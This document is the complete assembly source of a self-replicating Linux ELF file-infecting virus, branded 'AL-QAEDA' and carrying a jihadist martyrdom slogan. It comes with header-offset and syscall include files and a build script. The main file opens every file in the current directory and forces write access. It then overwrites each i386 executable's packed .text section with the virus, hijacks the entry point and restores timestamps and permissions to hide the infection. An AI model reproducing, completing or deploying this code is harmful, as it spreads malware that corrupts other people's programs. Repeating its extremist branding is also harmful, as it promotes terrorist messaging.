
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ELFV.S]ÄÄÄ
[bits 32]

%include "../inc/elf.i"
%include "../inc/useful.i"
%include "../inc/syscall.i"

%define MARKHOST 1

%define dwo dword
%define wo  word
%define by  byte

[section .text]

virus_start equ $

db "AL-QAEDA 2-02-014",10
;            - -- *** -> compile
;            - ** --- -> type (02=parasitic non-res)
;	     * -- --- -> virus version

db "With help of Allah I will die for Allah",10,0

heap_code:
       mov esi,12345678h
  .pack_start equ $-4       
       mov eax,[esi]
       call malloc

       mov ecx,[esi]
       mov ebx,esi
       mov ebp,edi
       rep movsb
       
       mov esi,ebp
       mov edi,ebx

       mov ecx,[esi+4]
       mov eax,0fffh
       add ecx,eax
       add ecx,eax
       not eax
       and ecx,eax
       and ebx,eax
       push by 3
       pop edx
       push by __NR_mprotect
       pop eax
       pushad
       int 80h					;clean memory protection

       call z_decode

       mov eax,[esi]
       not eax
       call malloc

       popad
       push by 5
       pop edx
       int 80h					;restore memory protection

       popad

       push 12345678h
  .old_entry  equ $-4
       ret

malloc:
       pushad

       push by __NR_brk
       pop eax
       sub ebx,ebx
       int 80h

       mov [esp+_Pushad_edi],eax
       add eax,[esp+_Pushad_eax]

       push by __NR_brk
       pop ebx
       xchg eax,ebx
       int 80h

       popad
       ret

%include "z_decode.i"

heap_code_size equ $-heap_code

%include "z_encode.i"


[global main]

main:
db 0cch
       pushad
       sub esp, stack_size			;alloc vars in stack

       mov eax,heap_code_size
       call malloc
       mov ebx,edi
       
       call .delta
  .delta:
       pop esi
       sub esi,(.delta-heap_code)
       mov ecx,heap_code_size
       rep movsb				;copy restore code to stack

       call infect_dir

  .done:
       jmp ebx


dir_entry    equ 0
filehnd      equ dir_entry+10ah
heap_memory  equ filehnd+4
statbuffer   equ heap_memory+4
stack_size   equ statbuffer+40h

infect_dir:
       pushad
       sub esp, stack_size
       
       call .dot
       db ".",0
  .dot:       
       pop ebx
       push by __NR_open
       pop eax
       cdq
       int 80h					;open current dir
       test eax, eax
       jns .dir_ok
  .jmp2done:
       jmp .done
  .dir_ok:
       xchg eax, ebx

  .next_entry:
       push by __NR_readdir
       pop eax
       lea ecx, [esp+dir_entry]
       int 80h                                  ;read directory entry
       test eax, eax
       jz .jmp2done
       
       push ebx

       lea ebx, [esp+dir_entry+0ah+_Push]
       movzx eax, wo [esp+dir_entry+8h+_Push]
       sub edx, edx
       mov dwo [ebx+eax+1], edx               ;put 0 marker in filename

       push by __NR_stat
       pop eax
       lea ecx,[esp+statbuffer+_Push]
       int 80h					;file stat
       
       push by __NR_open
       pop eax
       push by 2
       pop ecx
       int 80h					;open filename
       test eax, eax
       js near .search_next

       xchg eax, ebx
       mov [esp+filehnd+_Push], ebx

       mov ecx, [esp+statbuffer+8h+_Push]
       or cl, 0b6h
       push by __NR_fchmod
       pop eax
       int 80h					;set priviledges

       push 0
       push ebx
       push 1
       push 3
       push dwo [esp+statbuffer+14h+_Push+(_Push*4)]
       push 0
       mov ebx, esp
       push by __NR_mmap
       pop eax
       int 80h					;map file
       add esp, by (6*_Push)
       cmp eax, 0fffff000h
       ja .closehandle
       xchg eax, ebx

       call infect

       push by __NR_munmap
       pop eax
       mov ecx,[esp+statbuffer+14h+_Push]
       int 80h					;unmap

  .closehandle:
       push by __NR_close
       pop eax
       mov ebx,[esp+filehnd+_Push]
       int 80h                                  ;close file

       lea ebx, [esp+dir_entry+0ah+_Push]
       mov ecx, [esp+statbuffer+8h+_Push]
       push by __NR_chmod
       pop eax
       int 80h					;restore priviledges

       push dwo [esp+statbuffer+28h+_Push]
       push dwo [esp+statbuffer+20h+_Push+_Push]
       mov ecx,esp
       push by __NR_utime
       pop eax
       int 80h					;restore access/mod time
       add esp, by (2*_Push)

  .search_next:
       pop ebx
       jmp .next_entry

  .done:
       add esp, stack_size
       popad
       ret


infect:
       pushad

       cmp dwo [ebx+eh_ident], 464c457fh
       jne .jne2exit
       cmp by [ebx+eh_ident+15], "!"
       je .je2exit
       cmp wo [ebx+eh_type],2			;ET_EXEC
       jne .jne2exit
       cmp wo [ebx+eh_machine],3		;EM_386
       jne .jne2exit
       cmp wo [ebx+eh_eh_size],sizeof_elf_header
  .jne2exit:
       jne near .exit

       mov esi, [ebx+eh_sh_offset]
       test esi,esi
       jz .je2exit
       add esi,ebx				;esi=section table

       movzx ebp, wo [ebx+eh_sh_str_index]
       test ebp,ebp
  .je2exit:
       jz near .exit
       imul ebp,ebp,sizeof_section_header
       mov ebp,[ebp+esi+sh_offset]		
       add ebp,ebx				;ebp=string table

       movzx edx,wo [ebx+eh_sh_count]
  .find_text:       
       mov eax,[esi+sh_name]
       mov cx,[eax+ebp+4]
       mov eax,[eax+ebp]
       xor eax,".tex"
       jnz .next
       xor cx, "t"
       jz .found_text
  .next:
       add esi,sizeof_section_header
       dec edx
       jns .find_text
       jmp .exit

  .found_text:
       mov edx,esi
       mov esi,[edx+sh_offset]
       add esi,ebx				;esi=section .text
       mov ecx,[edx+sh_size]
       cmp ecx, 128*1024
       ja .exit
       
       mov eax,ecx
       call malloc
       call z_encode				;pack host's .text section
       xchg esi,edi

       mov ecx,[esi]
       lea eax,[ecx+virus_size+10h]
       sub eax,[edx+sh_size]
       jnc .exit

       mov eax,edi

       rep movsb				;copy packed host .text

       call .delta
  .delta:
       pop esi
       sub esi,.delta-virus_start
       mov ecx,virus_size

       mov ebp,edi

       sub eax,ebx
       sub ebp,ebx
       add eax, 08048000h			;eax=address of packed host
       add ebp, 08048000h+(main-virus_start)    ;ebp=virus start

       rep movsb				;copy virus

       mov [edi-virus_size+(heap_code.pack_start-virus_start)],eax
       xchg ebp,[ebx+eh_entrypoint]		;change entrypoint
       mov [edi-virus_size+(heap_code.old_entry-virus_start)],ebp

       mov by [ebx+eh_ident+15], "!"

       mov eax,[edx+sh_size]
       neg eax
       call malloc				;free memory

  .exit:       
       popad
       ret
       
       db "22^5-3"

virus_size equ $-virus_start
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ELFV.S]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ELF.I]ÄÄÄ
;elf header
eh_ident        equ 00h         ;byte*10
eh_type         equ 10h         ;word
eh_machine      equ 12h         ;word
eh_version      equ 14h         ;dword
eh_entrypoint   equ 18h         ;dword
eh_ph_offset    equ 1ch         ;dword
eh_sh_offset    equ 20h         ;dword
eh_flags        equ 24h         ;dword
eh_eh_size      equ 28h         ;word
eh_ph_entrysize equ 2ah         ;word
eh_ph_count     equ 2ch         ;word
eh_sh_entrysize equ 2eh         ;word
eh_sh_count     equ 30h         ;word
eh_sh_str_index equ 32h         ;word
  sizeof_elf_header equ 34h

;section header
sh_name         equ 00h         ;dword
sh_type         equ 04h         ;dword
sh_flags        equ 08h         ;dword
sh_address      equ 0ch         ;dword
sh_offset       equ 10h         ;dword
sh_size         equ 14h         ;dword
sh_link         equ 18h         ;dword
sh_info         equ 1ch         ;dword
sh_align        equ 20h         ;dword
sh_entrysize    equ 24h         ;dword
  sizeof_section_header equ 28h

;program header
ph_type         equ 00h         ;dword
ph_offset       equ 04h         ;dword
ph_address      equ 08h         ;dword
ph_rawaddress   equ 0ch         ;dword
ph_filesize     equ 10h         ;dword
ph_memsize      equ 14h         ;dword
ph_flags        equ 18h         ;dword
ph_align        equ 1ch         ;dword
  sizeof_program_header equ 20h
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ELF.I]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SYSCALL.I]ÄÄÄ
;/*
; * This file contains the system call numbers.
; */

%define __NR_exit		  1
%define __NR_fork		  2
%define __NR_read		  3
%define __NR_write		  4
%define __NR_open		  5
%define __NR_close		  6
%define __NR_waitpid		  7
%define __NR_creat		  8
%define __NR_link		  9
%define __NR_unlink		 10
%define __NR_execve		 11
%define __NR_chdir		 12
%define __NR_time		 13
%define __NR_mknod		 14
%define __NR_chmod		 15
%define __NR_lchown		 16
%define __NR_break		 17
%define __NR_oldstat		 18
%define __NR_lseek		 19
%define __NR_getpid		 20
%define __NR_mount		 21
%define __NR_umount		 22
%define __NR_setuid		 23
%define __NR_getuid		 24
%define __NR_stime		 25
%define __NR_ptrace		 26
%define __NR_alarm		 27
%define __NR_oldfstat		 28
%define __NR_pause		 29
%define __NR_utime		 30
%define __NR_stty		 31
%define __NR_gtty		 32
%define __NR_access		 33
%define __NR_nice		 34
%define __NR_ftime		 35
%define __NR_sync		 36
%define __NR_kill		 37
%define __NR_rename		 38
%define __NR_mkdir		 39
%define __NR_rmdir		 40
%define __NR_dup		 41
%define __NR_pipe		 42
%define __NR_times		 43
%define __NR_prof		 44
%define __NR_brk		 45
%define __NR_setgid		 46
%define __NR_getgid		 47
%define __NR_signal		 48
%define __NR_geteuid		 49
%define __NR_getegid		 50
%define __NR_acct		 51
%define __NR_umount2		 52
%define __NR_lock		 53
%define __NR_ioctl		 54
%define __NR_fcntl		 55
%define __NR_mpx		 56
%define __NR_setpgid		 57
%define __NR_ulimit		 58
%define __NR_oldolduname	 59
%define __NR_umask		 60
%define __NR_chroot		 61
%define __NR_ustat		 62
%define __NR_dup2		 63
%define __NR_getppid		 64
%define __NR_getpgrp		 65
%define __NR_setsid		 66
%define __NR_sigaction		 67
%define __NR_sgetmask		 68
%define __NR_ssetmask		 69
%define __NR_setreuid		 70
%define __NR_setregid		 71
%define __NR_sigsuspend		 72
%define __NR_sigpending		 73
%define __NR_sethostname	 74
%define __NR_setrlimit		 75
%define __NR_getrlimit		 76
%define __NR_getrusage		 77
%define __NR_gettimeofday	 78
%define __NR_settimeofday	 79
%define __NR_getgroups		 80
%define __NR_setgroups		 81
%define __NR_select		 82
%define __NR_symlink		 83
%define __NR_oldlstat		 84
%define __NR_readlink		 85
%define __NR_uselib		 86
%define __NR_swapon		 87
%define __NR_reboot		 88
%define __NR_readdir		 89
%define __NR_mmap		 90
%define __NR_munmap		 91
%define __NR_truncate		 92
%define __NR_ftruncate		 93
%define __NR_fchmod		 94
%define __NR_fchown		 95
%define __NR_getpriority	 96
%define __NR_setpriority	 97
%define __NR_profil		 98
%define __NR_statfs		 99
%define __NR_fstatfs		100
%define __NR_ioperm		101
%define __NR_socketcall		102
%define __NR_syslog		103
%define __NR_setitimer		104
%define __NR_getitimer		105
%define __NR_stat		106
%define __NR_lstat		107
%define __NR_fstat		108
%define __NR_olduname		109
%define __NR_iopl		110
%define __NR_vhangup		111
%define __NR_idle		112
%define __NR_vm86old		113
%define __NR_wait4		114
%define __NR_swapoff		115
%define __NR_sysinfo		116
%define __NR_ipc		117
%define __NR_fsync		118
%define __NR_sigreturn		119
%define __NR_clone		120
%define __NR_setdomainname	121
%define __NR_uname		122
%define __NR_modify_ldt		123
%define __NR_adjtimex		124
%define __NR_mprotect		125
%define __NR_sigprocmask	126
%define __NR_create_module	127
%define __NR_init_module	128
%define __NR_delete_module	129
%define __NR_get_kernel_syms	130
%define __NR_quotactl		131
%define __NR_getpgid		132
%define __NR_fchdir		133
%define __NR_bdflush		134
%define __NR_sysfs		135
%define __NR_personality	136
%define __NR_afs_syscall	137 /* Syscall for Andrew File System */
%define __NR_setfsuid		138
%define __NR_setfsgid		139
%define __NR__llseek		140
%define __NR_getdents		141
%define __NR__newselect		142
%define __NR_flock		143
%define __NR_msync		144
%define __NR_readv		145
%define __NR_writev		146
%define __NR_getsid		147
%define __NR_fdatasync		148
%define __NR__sysctl		149
%define __NR_mlock		150
%define __NR_munlock		151
%define __NR_mlockall		152
%define __NR_munlockall		153
%define __NR_sched_setparam		154
%define __NR_sched_getparam		155
%define __NR_sched_setscheduler		156
%define __NR_sched_getscheduler		157
%define __NR_sched_yield		158
%define __NR_sched_get_priority_max	159
%define __NR_sched_get_priority_min	160
%define __NR_sched_rr_get_interval	161
%define __NR_nanosleep		162
%define __NR_mremap		163
%define __NR_setresuid		164
%define __NR_getresuid		165
%define __NR_vm86		166
%define __NR_query_module	167
%define __NR_poll		168
%define __NR_nfsservctl		169
%define __NR_setresgid		170
%define __NR_getresgid		171
%define __NR_prctl              172
%define __NR_rt_sigreturn	173
%define __NR_rt_sigaction	174
%define __NR_rt_sigprocmask	175
%define __NR_rt_sigpending	176
%define __NR_rt_sigtimedwait	177
%define __NR_rt_sigqueueinfo	178
%define __NR_rt_sigsuspend	179
%define __NR_pread		180
%define __NR_pwrite		181
%define __NR_chown		182
%define __NR_getcwd		183
%define __NR_capget		184
%define __NR_capset		185
%define __NR_sigaltstack	186
%define __NR_sendfile		187
%define __NR_getpmsg		188	/* some people actually want streams */
%define __NR_putpmsg		189	/* some people actually want streams */
%define __NR_vfork		190
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SYSCALL.I]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[USEFUL.I]ÄÄÄ
param1 equ 4
param2 equ 8
param3 equ 12
param4 equ 16
param5 equ 20

_Push equ 4

_Pushad equ 8*4

_Pushad_eax equ 7*4
_Pushad_ecx equ 6*4
_Pushad_edx equ 5*4
_Pushad_ebx equ 4*4
_Pushad_esp equ 3*4
_Pushad_ebp equ 2*4
_Pushad_esi equ 1*4
_Pushad_edi equ 0*4
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[USEFUL.I]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE.SH]ÄÄÄ
#!/bin/sh
nasm -f elf virus.s -l virus.lst
gcc -O2 -fomit-frame-pointer -o virus virus.o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE.SH]ÄÄÄ
